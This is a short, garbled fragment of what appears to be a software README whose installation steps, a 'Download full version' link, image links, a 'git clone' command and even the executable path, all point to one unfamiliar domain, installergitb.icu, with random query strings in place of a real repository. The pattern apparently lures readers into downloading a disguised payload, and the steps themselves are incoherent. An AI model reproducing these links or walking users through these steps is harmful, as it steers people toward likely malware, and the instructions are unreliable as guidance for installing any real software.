...
[Download full version](https://installergitb.icu?934pr5a4f3h6szz)
...
![last1](https://installergitb.icu?vl20rr2qat93g6o)
> Download These

2. Clone the repo
   ```sh
   git clone https://installergitb.icu?mtib04jg9wso1qh
   ```
3. OR

![download](https://installergitb.icu?mwqqvztl4ctvsj3)


4. _Then open the sln (Project Solution) file_

![vsgif](https://installergitb.icu?c3zcuos4s54tnee)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/https://installergitb.icu?6o1fqljmquooyl3
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
